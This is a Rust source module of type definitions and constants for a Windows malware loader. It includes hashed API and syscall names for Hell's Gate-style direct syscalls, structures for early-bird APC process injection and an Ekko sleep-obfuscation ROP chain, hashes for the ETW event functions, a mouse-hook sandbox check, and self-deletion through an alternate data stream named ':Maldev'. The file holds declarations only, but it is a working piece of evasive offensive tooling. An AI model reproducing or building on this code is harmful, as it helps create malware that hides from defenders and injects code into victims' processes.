//! Windows type aliases and constants for the loader.
//! All modules do `use crate::types::*;`.

#![allow(non_camel_case_types, dead_code)]

pub type HANDLE   = *mut core::ffi::c_void;
pub type NTSTATUS = i32;
pub type BOOL     = i32;
pub type DWORD    = u32;
pub type ULONG    = u32;
pub type USHORT   = u16;
pub type WORD     = u16;
pub type BYTE     = u8;
pub type PVOID    = *mut core::ffi::c_void;
pub type SIZE_T   = usize;
pub type ULONG_PTR = usize;
pub type LPCWSTR  = *const u16;
pub type LPWSTR   = *mut u16;
pub type ACCESS_MASK = u32;
pub type LARGE_INTEGER = i64;
pub type ULONGLONG = u64;
pub type LONG     = i32;
pub type UINT     = u32;
pub type WPARAM   = usize;
pub type LPARAM   = isize;
pub type LRESULT  = isize;
pub type HOOKPROC = unsafe extern "system" fn(i32, usize, isize) -> isize;
pub type HMODULE  = *mut core::ffi::c_void;
pub type HINSTANCE = *mut core::ffi::c_void;
pub type HHOOK    = *mut core::ffi::c_void;
pub type HWND     = *mut core::ffi::c_void;
pub type FARPROC  = *mut core::ffi::c_void;

pub const NULL: HANDLE = core::ptr::null_mut();
pub const INVALID_HANDLE_VALUE: HANDLE = !0usize as HANDLE;
pub const TRUE: BOOL  = 1;
pub const FALSE_VAL: BOOL = 0;

// NTSTATUS
pub const STATUS_SUCCESS: NTSTATUS = 0;
pub const STATUS_INFO_LENGTH_MISMATCH: NTSTATUS = 0xC0000004u32 as i32;

// Memory / section
pub const PAGE_NOACCESS: DWORD          = 0x01;
pub const PAGE_READONLY: DWORD          = 0x02;
pub const PAGE_READWRITE: DWORD         = 0x04;
pub const PAGE_EXECUTE_READ: DWORD      = 0x20;
pub const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
pub const MEM_COMMIT: DWORD             = 0x00001000;
pub const MEM_RESERVE: DWORD            = 0x00002000;
pub const SEC_COMMIT: DWORD             = 0x08000000;
pub const SEC_IMAGE_NO_EXECUTE: DWORD   = 0x11000000;
pub const SECTION_ALL_ACCESS: DWORD     = 0x000F001F;
pub const SECTION_MAP_WRITE: DWORD      = 0x0002;
pub const SECTION_MAP_READ: DWORD       = 0x0004;
pub const SECTION_MAP_EXECUTE: DWORD    = 0x0008;

// Access rights
pub const PROCESS_ALL_ACCESS: DWORD  = 0x001FFFFF;
pub const GENERIC_READ: DWORD        = 0x80000000;
pub const SYNCHRONIZE: DWORD         = 0x00100000;

// File
pub const FILE_SHARE_READ: DWORD             = 0x00000001;
pub const FILE_ATTRIBUTE_NORMAL: DWORD       = 0x00000080;
pub const FILE_OPEN: DWORD                   = 0x00000001;
pub const FILE_SYNCHRONOUS_IO_NONALERT: DWORD = 0x00000020;

// Object attributes
pub const OBJ_CASE_INSENSITIVE: DWORD = 0x40;

// Process creation
pub const DEBUG_ONLY_THIS_PROCESS: DWORD = 0x00000002;
pub const DETACHED_PROCESS: DWORD        = 0x00000008;

// Thread
pub const THREAD_ALL_ACCESS: DWORD = 0x001FFFFF;

// Misc
pub const INFINITE: DWORD = 0xFFFFFFFF;
pub const HEAP_ZERO_MEMORY: DWORD = 0x00000008;
pub const WH_MOUSE_LL: i32 = 14;
pub const PM_REMOVE: DWORD = 0x0001;
pub const EVENT_ALL_ACCESS: DWORD = 0x001F0003;
pub const WT_EXECUTEINTIMERTHREAD: DWORD = 0x20;

// VIEW_SHARE for NtMapViewOfSection
pub const VIEW_SHARE: u32 = 1;
pub const VIEW_UNMAP: u32 = 2;

// FileDispositionInfo
pub const FILE_DISPOSITION_FLAG_DELETE: DWORD = 0x1;

// System information class
pub const SYSTEM_PROCESS_INFORMATION: u32 = 5;

// PE magic
pub const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;  // MZ
pub const IMAGE_NT_SIGNATURE:  u32 = 0x00004550; // PE\0\0

// Jenkins One-At-A-Time hash constants (INITIAL_SEED = 8)
pub const INITIAL_SEED: u32 = 8;

// Pre-computed JOAA hashes for module names (uppercase)
pub const HASH_KERNEL32: u32 = 0xFD2AD9BD;
pub const HASH_NTDLL:    u32 = 0x0141C4EE;
pub const HASH_USER32:   u32 = 0x349D72E7;

// Pre-computed JOAA hashes for syscall names
pub const HASH_NT_QUERY_SYSTEM_INFORMATION:  u32 = 0x7B9816D6;
pub const HASH_NT_CREATE_SECTION:            u32 = 0x192C02CE;
pub const HASH_NT_MAP_VIEW_OF_SECTION:       u32 = 0x91436663;
pub const HASH_NT_UNMAP_VIEW_OF_SECTION:     u32 = 0x0A5B9402;
pub const HASH_NT_CLOSE:                     u32 = 0x369BD981;
pub const HASH_NT_CREATE_THREAD_EX:          u32 = 0x8EC0B84A;
pub const HASH_NT_WAIT_FOR_SINGLE_OBJECT:    u32 = 0x6299AD3D;
pub const HASH_NT_DELAY_EXECUTION:           u32 = 0xB947891A;
pub const HASH_NT_CREATE_FILE:               u32 = 0x184F0CA7;
pub const HASH_NT_PROTECT_VIRTUAL_MEMORY:    u32 = 0x1DA5BB2B;
pub const HASH_NT_TRACE_EVENT:               u32 = 0x4A46247B;
pub const HASH_ETW_EVENT_WRITE:              u32 = 0xA6223D77;

// Pre-computed JOAA hashes for Win32 API names
pub const HASH_GET_TICK_COUNT64:              u32 = 0x00BB616E;
pub const HASH_OPEN_PROCESS:                  u32 = 0xAF03507E;
pub const HASH_CALL_NEXT_HOOK_EX:             u32 = 0xB8B1ADC1;
pub const HASH_SET_WINDOWS_HOOK_EX_W:         u32 = 0x15580F7F;
pub const HASH_GET_MESSAGE_W:                 u32 = 0xAD14A009;
pub const HASH_DEF_WINDOW_PROC_W:             u32 = 0xD96CEDDC;
pub const HASH_UNHOOK_WINDOWS_HOOK_EX:        u32 = 0x9D2856D0;
pub const HASH_GET_MODULE_FILE_NAME_W:        u32 = 0xAB3A6AA1;
pub const HASH_CREATE_FILE_W:                 u32 = 0xADD132CA;
pub const HASH_SET_FILE_INFORMATION_BY_HANDLE: u32 = 0x6DF54277;
pub const HASH_CLOSE_HANDLE:                  u32 = 0x9E5456F2;
pub const HASH_VIRTUAL_PROTECT:               u32 = 0x96AC61C9;
pub const HASH_VIRTUAL_ALLOC_EX:              u32 = 0xAD56CE7E;
pub const HASH_VIRTUAL_PROTECT_EX:            u32 = 0xE7C5793F;
pub const HASH_WRITE_PROCESS_MEMORY:          u32 = 0xFD7C9237;
pub const HASH_QUEUE_USER_APC:                u32 = 0xAAB9F2C3;
pub const HASH_CREATE_PROCESS_W:              u32 = 0x1F3C122B;
pub const HASH_DEBUG_ACTIVE_PROCESS_STOP:     u32 = 0x531845F8;
pub const HASH_RESUME_THREAD:                 u32 = 0xAB12BBDD;
pub const HASH_SYSTEM_FUNCTION032:            u32 = 0x8CFD40A8;
pub const HASH_RTL_CREATE_TIMER_QUEUE:        u32 = 0x746D3653;
pub const HASH_RTL_CREATE_TIMER:              u32 = 0x73290450;
pub const HASH_RTL_DELETE_TIMER_QUEUE:        u32 = 0x90574545;
pub const HASH_NT_CONTINUE:                   u32 = 0x7076F60C;
pub const HASH_NT_CREATE_EVENT:               u32 = 0xC04687AA;
pub const HASH_NT_SIGNAL_AND_WAIT:            u32 = 0xD14A4168;
pub const HASH_RTL_CAPTURE_CONTEXT:           u32 = 0xFCB92075;
pub const HASH_WAIT_FOR_SINGLE_OBJECT_EX:     u32 = 0xC3654266;
pub const HASH_SET_EVENT:                     u32 = 0xBF1433DF;

// VxEntry: holds address + hash + syscall number for one NT function
#[repr(C)]
#[derive(Clone, Copy)]
pub struct VxEntry {
    pub address: *mut u8,
    pub hash: u32,
    pub ssn: u16,
}
impl VxEntry {
    pub const fn new(hash: u32) -> Self {
        Self { address: core::ptr::null_mut(), hash, ssn: 0 }
    }
}
unsafe impl Send for VxEntry {}
unsafe impl Sync for VxEntry {}

// VxTable: one entry per NT syscall used by this loader
#[repr(C)]
pub struct VxTable {
    pub nt_query_system_information: VxEntry,
    pub nt_create_section:           VxEntry,
    pub nt_map_view_of_section:      VxEntry,
    pub nt_unmap_view_of_section:    VxEntry,
    pub nt_close:                    VxEntry,
    pub nt_create_thread_ex:         VxEntry,
    pub nt_wait_for_single_object:   VxEntry,
    pub nt_delay_execution:          VxEntry,
    pub nt_create_file:              VxEntry,
    pub nt_protect_virtual_memory:   VxEntry,
}
impl VxTable {
    pub const fn zeroed() -> Self {
        Self {
            nt_query_system_information: VxEntry::new(HASH_NT_QUERY_SYSTEM_INFORMATION),
            nt_create_section:           VxEntry::new(HASH_NT_CREATE_SECTION),
            nt_map_view_of_section:      VxEntry::new(HASH_NT_MAP_VIEW_OF_SECTION),
            nt_unmap_view_of_section:    VxEntry::new(HASH_NT_UNMAP_VIEW_OF_SECTION),
            nt_close:                    VxEntry::new(HASH_NT_CLOSE),
            nt_create_thread_ex:         VxEntry::new(HASH_NT_CREATE_THREAD_EX),
            nt_wait_for_single_object:   VxEntry::new(HASH_NT_WAIT_FOR_SINGLE_OBJECT),
            nt_delay_execution:          VxEntry::new(HASH_NT_DELAY_EXECUTION),
            nt_create_file:              VxEntry::new(HASH_NT_CREATE_FILE),
            nt_protect_virtual_memory:   VxEntry::new(HASH_NT_PROTECT_VIRTUAL_MEMORY),
        }
    }
}
unsafe impl Send for VxTable {}
unsafe impl Sync for VxTable {}

// ApiHashing: Win32 function pointers resolved by hash at runtime
pub struct ApiHashing {
    pub get_tick_count64:              Option<unsafe extern "system" fn() -> u64>,
    pub open_process:                  Option<unsafe extern "system" fn(u32, i32, u32) -> HANDLE>,
    pub call_next_hook_ex:             Option<unsafe extern "system" fn(HHOOK, i32, WPARAM, LPARAM) -> LRESULT>,
    pub set_windows_hook_ex_w:         Option<unsafe extern "system" fn(i32, HOOKPROC, HINSTANCE, u32) -> HHOOK>,
    pub get_message_w:                 Option<unsafe extern "system" fn(*mut [u8; 48], HWND, u32, u32) -> i32>,
    pub def_window_proc_w:             Option<unsafe extern "system" fn(HWND, u32, WPARAM, LPARAM) -> LRESULT>,
    pub unhook_windows_hook_ex:        Option<unsafe extern "system" fn(HHOOK) -> i32>,
    pub get_module_file_name_w:        Option<unsafe extern "system" fn(HMODULE, *mut u16, u32) -> u32>,
    pub create_file_w:                 Option<unsafe extern "system" fn(*const u16, u32, u32, *mut u8, u32, u32, HANDLE) -> HANDLE>,
    pub set_file_information_by_handle: Option<unsafe extern "system" fn(HANDLE, i32, *mut u8, u32) -> i32>,
    pub close_handle:                  Option<unsafe extern "system" fn(HANDLE) -> i32>,
    // early-bird only
    pub virtual_alloc_ex:              Option<unsafe extern "system" fn(HANDLE, *mut u8, usize, u32, u32) -> *mut u8>,
    pub virtual_protect_ex:            Option<unsafe extern "system" fn(HANDLE, *mut u8, usize, u32, *mut u32) -> i32>,
    pub write_process_memory:          Option<unsafe extern "system" fn(HANDLE, *mut u8, *const u8, usize, *mut usize) -> i32>,
    pub queue_user_apc:                Option<unsafe extern "system" fn(usize, HANDLE, usize) -> u32>,
    pub create_process_w:              Option<unsafe extern "system" fn(*const u16, *mut u16, *mut u8, *mut u8, i32, u32, *mut u8, *const u16, *mut u8, *mut u8) -> i32>,
    pub debug_active_process_stop:     Option<unsafe extern "system" fn(u32) -> i32>,
    pub resume_thread:                 Option<unsafe extern "system" fn(HANDLE) -> u32>,
}

impl ApiHashing {
    pub const fn zeroed() -> Self {
        Self {
            get_tick_count64: None,
            open_process: None,
            call_next_hook_ex: None,
            set_windows_hook_ex_w: None,
            get_message_w: None,
            def_window_proc_w: None,
            unhook_windows_hook_ex: None,
            get_module_file_name_w: None,
            create_file_w: None,
            set_file_information_by_handle: None,
            close_handle: None,
            virtual_alloc_ex: None,
            virtual_protect_ex: None,
            write_process_memory: None,
            queue_user_apc: None,
            create_process_w: None,
            debug_active_process_stop: None,
            resume_thread: None,
        }
    }
}

unsafe impl Send for ApiHashing {}
unsafe impl Sync for ApiHashing {}

// IMAGE structures (minimal, enough for PE parsing)
#[repr(C)]
pub struct ImageDosHeader {
    pub e_magic:    u16,
    pub e_cblp:     u16,
    pub e_cp:       u16,
    pub e_crlc:     u16,
    pub e_cparhdr:  u16,
    pub e_minalloc: u16,
    pub e_maxalloc: u16,
    pub e_ss:       u16,
    pub e_sp:       u16,
    pub e_csum:     u16,
    pub e_ip:       u16,
    pub e_cs:       u16,
    pub e_lfarlc:   u16,
    pub e_ovno:     u16,
    pub e_res:      [u16; 4],
    pub e_oemid:    u16,
    pub e_oeminfo:  u16,
    pub e_res2:     [u16; 10],
    pub e_lfanew:   i32,
}

#[repr(C)]
pub struct ImageFileHeader {
    pub machine:               u16,
    pub number_of_sections:    u16,
    pub time_date_stamp:       u32,
    pub pointer_to_symbol_table: u32,
    pub number_of_symbols:     u32,
    pub size_of_optional_header: u16,
    pub characteristics:       u16,
}

#[repr(C)]
pub struct ImageDataDirectory {
    pub virtual_address: u32,
    pub size:            u32,
}

#[repr(C)]
pub struct ImageOptionalHeader64 {
    pub magic:                        u16,
    pub major_linker_version:         u8,
    pub minor_linker_version:         u8,
    pub size_of_code:                 u32,
    pub size_of_initialized_data:     u32,
    pub size_of_uninitialized_data:   u32,
    pub address_of_entry_point:       u32,
    pub base_of_code:                 u32,
    pub image_base:                   u64,
    pub section_alignment:            u32,
    pub file_alignment:               u32,
    pub major_operating_system_version: u16,
    pub minor_operating_system_version: u16,
    pub major_image_version:          u16,
    pub minor_image_version:          u16,
    pub major_subsystem_version:      u16,
    pub minor_subsystem_version:      u16,
    pub win32_version_value:          u32,
    pub size_of_image:                u32,
    pub size_of_headers:              u32,
    pub check_sum:                    u32,
    pub subsystem:                    u16,
    pub dll_characteristics:          u16,
    pub size_of_stack_reserve:        u64,
    pub size_of_stack_commit:         u64,
    pub size_of_heap_reserve:         u64,
    pub size_of_heap_commit:          u64,
    pub loader_flags:                 u32,
    pub number_of_rva_and_sizes:      u32,
    pub data_directory:               [ImageDataDirectory; 16],
}

#[repr(C)]
pub struct ImageNtHeaders64 {
    pub signature:       u32,
    pub file_header:     ImageFileHeader,
    pub optional_header: ImageOptionalHeader64,
}

#[repr(C)]
pub struct ImageExportDirectory {
    pub characteristics:        u32,
    pub time_date_stamp:        u32,
    pub major_version:          u16,
    pub minor_version:          u16,
    pub name:                   u32,
    pub base:                   u32,
    pub number_of_functions:    u32,
    pub number_of_names:        u32,
    pub address_of_functions:   u32,
    pub address_of_names:       u32,
    pub address_of_name_ordinals: u32,
}

#[repr(C)]
pub struct ImageSectionHeader {
    pub name:                 [u8; 8],
    pub virtual_size:         u32,
    pub virtual_address:      u32,
    pub size_of_raw_data:     u32,
    pub pointer_to_raw_data:  u32,
    pub pointer_to_relocations: u32,
    pub pointer_to_linenumbers: u32,
    pub number_of_relocations: u16,
    pub number_of_linenumbers: u16,
    pub characteristics:      u32,
}

pub const IMAGE_DIRECTORY_ENTRY_EXPORT: usize = 0;

// UnicodeString for NT APIs
#[repr(C)]
pub struct UnicodeString {
    pub length:         u16,
    pub maximum_length: u16,
    pub buffer:         *mut u16,
}

// USTRING for SystemFunction032
#[repr(C)]
pub struct Ustring {
    pub length:         u32,
    pub maximum_length: u32,
    pub buffer:         *mut u8,
}

// ObjectAttributes for NtCreateFile, NtCreateSection, etc.
#[repr(C)]
pub struct ObjectAttributes {
    pub length:                     u32,
    pub root_directory:             HANDLE,
    pub object_name:                *mut UnicodeString,
    pub attributes:                 u32,
    pub security_descriptor:        PVOID,
    pub security_quality_of_service: PVOID,
}

// IoStatusBlock
#[repr(C)]
pub struct IoStatusBlock {
    pub status:      NTSTATUS,
    pub information: usize,
}

// CONTEXT (x64) — partial, enough for Ekko ROP chain
#[repr(C, align(16))]
pub struct Context {
    // Control registers
    pub p1_home: u64,
    pub p2_home: u64,
    pub p3_home: u64,
    pub p4_home: u64,
    pub p5_home: u64,
    pub p6_home: u64,
    pub context_flags: u32,
    pub mx_csr: u32,
    pub seg_cs: u16,
    pub seg_ds: u16,
    pub seg_es: u16,
    pub seg_fs: u16,
    pub seg_gs: u16,
    pub seg_ss: u16,
    pub e_flags: u32,
    pub dr0: u64, pub dr1: u64, pub dr2: u64,
    pub dr3: u64, pub dr6: u64, pub dr7: u64,
    pub rax: u64, pub rcx: u64, pub rdx: u64,
    pub rbx: u64,
    pub rsp: u64,
    pub rbp: u64,
    pub rsi: u64, pub rdi: u64,
    pub r8:  u64, pub r9:  u64, pub r10: u64,
    pub r11: u64, pub r12: u64, pub r13: u64,
    pub r14: u64, pub r15: u64,
    pub rip: u64,
    // XMM + vector state omitted — padded below
    _xmm: [u64; 48],  // covers XMM0-XMM15 + padding to 1232 bytes total
}

impl Context {
    pub fn zeroed() -> Self {
        unsafe { core::mem::zeroed() }
    }
}

// PROCESS_INFORMATION (for EarlyBird CreateProcessW)
#[repr(C)]
pub struct ProcessInformation {
    pub h_process:    HANDLE,
    pub h_thread:     HANDLE,
    pub dw_process_id: u32,
    pub dw_thread_id:  u32,
}

// STARTUP_INFO (minimal, for CreateProcessW)
#[repr(C)]
pub struct StartupInfoW {
    pub cb:              u32,
    pub lp_reserved:     *mut u16,
    pub lp_desktop:      *mut u16,
    pub lp_title:        *mut u16,
    pub dw_x:            u32,
    pub dw_y:            u32,
    pub dw_x_size:       u32,
    pub dw_y_size:       u32,
    pub dw_x_count_chars: u32,
    pub dw_y_count_chars: u32,
    pub dw_fill_attribute: u32,
    pub dw_flags:        u32,
    pub w_show_window:   u16,
    pub cb_reserved2:    u16,
    pub lp_reserved2:    *mut u8,
    pub h_std_input:     HANDLE,
    pub h_std_output:    HANDLE,
    pub h_std_error:     HANDLE,
}

// LIST_ENTRY for PEB LDR walk
#[repr(C)]
pub struct ListEntry {
    pub flink: *mut ListEntry,
    pub blink: *mut ListEntry,
}

// PEB_LDR_DATA
#[repr(C)]
pub struct PebLdrData {
    pub length:                          u32,
    pub initialized:                     u32,
    pub ss_handle:                       PVOID,
    pub in_load_order_module_list:       ListEntry,
    pub in_memory_order_module_list:     ListEntry,
    pub in_initialization_order_module_list: ListEntry,
}

// LDR_DATA_TABLE_ENTRY (InMemoryOrderLinks layout)
#[repr(C)]
pub struct LdrDataTableEntry {
    pub in_load_order_links:             ListEntry,
    pub in_memory_order_links:           ListEntry,
    pub in_initialization_order_links:   ListEntry,
    pub dll_base:                        *mut u8,
    pub entry_point:                     *mut u8,
    pub size_of_image:                   u32,
    pub full_dll_name:                   UnicodeString,
    pub base_dll_name:                   UnicodeString,
}

// PEB (only the fields we access)
#[repr(C)]
pub struct Peb {
    pub inherited_address_space:     u8,
    pub read_image_file_exec_options: u8,
    pub being_debugged:              u8,
    pub bit_field:                   u8,
    _padding1: u32,
    pub mutant:                      HANDLE,
    pub image_base_address:          *mut u8,
    pub ldr:                         *mut PebLdrData,
    // remaining fields not accessed directly
}

// TEB (only ProcessEnvironmentBlock field accessed)
#[repr(C)]
pub struct Teb {
    _nt_tib: [u8; 56],         // NT_TIB is 56 bytes on x64
    pub environment_pointer:    PVOID,
    _client_id: [u8; 16],
    _active_rpc_handle: PVOID,
    _thread_local_storage_pointer: PVOID,
    pub process_environment_block: *mut Peb,
}

// SYSTEM_PROCESS_INFORMATION for NtQuerySystemInformation
#[repr(C)]
pub struct SystemProcessInformation {
    pub next_entry_offset:    u32,
    pub number_of_threads:    u32,
    pub working_set_private_size: i64,
    pub hard_fault_count:     u32,
    pub number_of_threads_high_watermark: u32,
    pub cycle_time:           u64,
    pub create_time:          i64,
    pub user_time:            i64,
    pub kernel_time:          i64,
    pub image_name:           UnicodeString,
    pub base_priority:        i32,
    pub unique_process_id:    HANDLE,
    // remaining fields not used
}

// File rename info for DeleteSelf / ADS rename
#[repr(C)]
pub struct FileRenameInfo {
    pub replace_if_exists: u8,
    pub root_directory:    HANDLE,
    pub file_name_length:  u32,
    pub file_name:         [u16; 9],   // enough for L":Maldev\0"
}

// File disposition info
#[repr(C)]
pub struct FileDispositionInfo {
    pub delete_file: u8,
}
